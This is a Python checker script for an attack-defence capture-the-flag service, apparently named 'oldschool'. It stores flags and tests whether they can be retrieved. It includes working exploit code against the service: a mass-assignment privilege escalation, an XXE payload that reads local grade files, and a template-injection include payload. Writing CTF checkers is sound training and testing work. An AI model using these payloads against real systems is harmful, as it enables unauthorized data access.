import asyncio
from bs4 import BeautifulSoup
import io

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in, assert_equals

from httpx import AsyncClient, Response

from logging import LoggerAdapter

from subprocess import Popen, PIPE

import string

from typing import Any, Optional

import random

import os

import re

"""
Checker config
"""

SERVICE_PORT = 9080
checker = Enochecker("oldschool", SERVICE_PORT)


def app():
    return checker.app


"""
Utility functions
"""


random.seed(int.from_bytes(os.urandom(16), "little"))
alphabet = string.ascii_letters + string.digits


def parse_flag(text: str):
    soup = BeautifulSoup(text, "html.parser")
    flag = (
        soup.find("p", string=lambda text: text and text.startswith("Flag:"))
        .get_text(strip=True)
        .split(":", 1)[1]
        .strip()
    )
    return flag


def noise(min_len: int, max_len: int):
    len = random.randint(min_len, max_len)
    return "".join(random.choice(alphabet) for _ in range(len))


def assert_status_code(
    logger: LoggerAdapter,
    r: Response,
    code: int,
    errmsg: Optional[str],
    info: Any = "",
) -> None:
    if r.status_code != code:
        logger.error(
            f"Bad http status code for "
            + f"{r.request.method} {r.request.url.path}:\n"
            + f"Info: {str(info)}\n{r.text}"
        )
        if errmsg is None:
            errmsg = f"{r.request.method} {r.request.url.path} failed"
        raise MumbleException(errmsg)


def parse_filename(text: str):
    soup = BeautifulSoup(text, "html.parser")
    last_li = soup.find("li")
    if last_li:
        filename = last_li.text.split("\n")[1].strip()
        return filename
    else:
        raise MumbleException("No grade filename found")


def parse_filecontent(text: str):
    soup = BeautifulSoup(text, "html.parser")
    last_li = soup.find("li")
    if last_li:
        filename = last_li.text.split("\n")[3].strip()
        return filename
    else:
        raise MumbleException("No grade filecontent found")


def parse_courseid(text: str, title: str):
    soup = BeautifulSoup(text, "html.parser")
    li_tags = soup.find_all("li")

    for li in li_tags:
        if li.h3:
            cleaned_name = li.h3.text.strip().replace("\n", "")
            if title in cleaned_name:
                id_value = re.search(r"\(ID:\s*(\d+)\s*\)", cleaned_name)
                if id_value:
                    return id_value.group(1)

    raise MumbleException("No Course Id found")


def generate_xxe_payload(filename: str):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///service/grades/{filename}">
]>
<data>
    <course>
        <name>Malicious Course</name>
        <description>&xxe;</description>
    </course>
</data>"""


def generate_course(name: str, description: str):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<data>
    <course>
        <name>{name}</name>
        <description>{description}</description>
    </course>
</data>"""


def generate_ssti_payload(filename: str):
    return f"{{% include 'grades/{filename}' %}}"


"""
Checker functions
"""


@checker.putflag(0)
async def putflag_db(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # parse user id
    r = await client.get("/index.php?action=home")
    assert_status_code(logger, r, 200, "Get home page failed")
    id_match = re.search(r'href="index\.php\?action=profile&id=(\d+)"', r.text)
    user_id = id_match.group(1)

    # update profile
    name, flag = noise(5, 16), task.flag
    data = {"username": username, "name": name, "flag": flag}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(logger, r, 200, "Update Profile failed")

    # create new course and become course admin
    title = noise(10, 12)
    files = {
        "title": (None, title),
        "course_data": (
            "newcourse.xml",
            io.BytesIO(generate_course(noise(3, 5), noise(10, 20)).encode()),
            "text/xml",
        ),
    }
    r = await client.post("/index.php?action=courses", files=files)
    assert_status_code(logger, r, 201, "Upload Course failed", info=data)

    # parse course id
    rcrs = await client.get("/index.php?action=courses")
    assert_status_code(logger, rcrs, 200, "Get courses failed")
    course_id = parse_courseid(rcrs.text, title)

    await db.set("info", (username, password, user_id, course_id))

    return f"User {username} Id {user_id} Course {course_id}"  # This is attack info


@checker.getflag(0)
async def getflag_db(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password, user_id, course_id = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")

    r = await client.get(f"/index.php?action=profile&id={user_id}")
    assert_status_code(logger, r, 200, "Access profile failed")
    flag = parse_flag(r.text)

    assert_in(task.flag, flag, "Flag missing")


@checker.putflag(1)
async def putflag_db(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # create the grade file
    file_obj = io.BytesIO(task.flag.encode())

    # post grade
    r = await client.post("/index.php?action=grades", files={"grades": file_obj})
    assert_status_code(logger, r, 201, "Upload Grade failed")
    filename = parse_filename(r.text)
    if not filename:
        raise MumbleException("Filename missing")

    await db.set("info", (username, password))

    return f"User {username} Uploaded Grade {filename}"  # This is attack info


@checker.getflag(1)
async def getflag_db(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        username, password = await db.get("info")
    except KeyError:
        raise MumbleException("database entry missing")

    data = {"username": username, "password": password}
    r = await client.post("/index.php?action=login", data=data)
    assert_status_code(logger, r, 302, "Login failed")

    r = await client.get(f"/index.php?action=grades")
    assert_status_code(logger, r, 200, "Access grades failed")
    flag = parse_filecontent(r.text)

    assert_in(task.flag, flag, "Flag missing")


@checker.exploit(0)
async def exploit_mass_assign(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    print(task.attack_info)
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 6)

    # Attack info is in the form of "User {username} Id {user_id} Course {course_id}"
    _, _, _, flaguser_id, _, flagcourse_id = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter0_" + username, "password": "password"}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed")

    # exploit mass assignment in update profile
    data = {"username": "exploiter_" + username, "admin_of": flagcourse_id}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(
        logger, r, 200, "Mass assignment vuln in update Profile failed", info=data
    )

    # get flag
    r = await client.get(f"/index.php?action=profile&id={flaguser_id}")
    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


@checker.exploit(1)
async def exploit_xxe(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 5)

    # Attack info is in the form of "User {username} Uploaded Grade {filename}"
    _, _, _, _, filename = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter1_" + username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed", info=data)

    # exploit xxe in course upload
    files = {
        "title": (None, "Malicious Course"),
        "course_data": (
            "exploit4.xml",
            io.BytesIO(generate_xxe_payload(filename).encode()),
            "text/xml",
        ),
        "is_private": (None, "on"),
    }
    r = await client.post("/index.php?action=courses", files=files)
    assert_status_code(logger, r, 201, "Upload Course failed", info=data)

    # get flag
    r = await client.get(f"/index.php?action=courses")
    assert_status_code(logger, r, 200, "Courses Missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


@checker.exploit(2)
async def exploit_ssti(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 5)

    # Attack info: "User {username} Uploaded Grade {filename}"
    _, _, _, _, filename = task.attack_info.split()

    # register user and login
    username, password = noise(10, 15), noise(16, 20)
    data = {"username": "exploiter2_" + username, "password": password}
    r = await client.post("/index.php?action=register", data=data)
    assert_status_code(logger, r, 302, "Register failed", info=data)

    # exploit ssti in update profile
    data = {"about_me": generate_ssti_payload(filename)}
    r = await client.post("/index.php?action=profile", data=data)
    assert_status_code(
        logger, r, 200, "Update about_me in update Profile failed", info=data
    )

    # get flag
    r = await client.get(f"/index.php?action=profile")
    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
    flag = searcher.search_flag(r.text)
    if flag is not None:
        return flag


if __name__ == "__main__":
    checker.run()
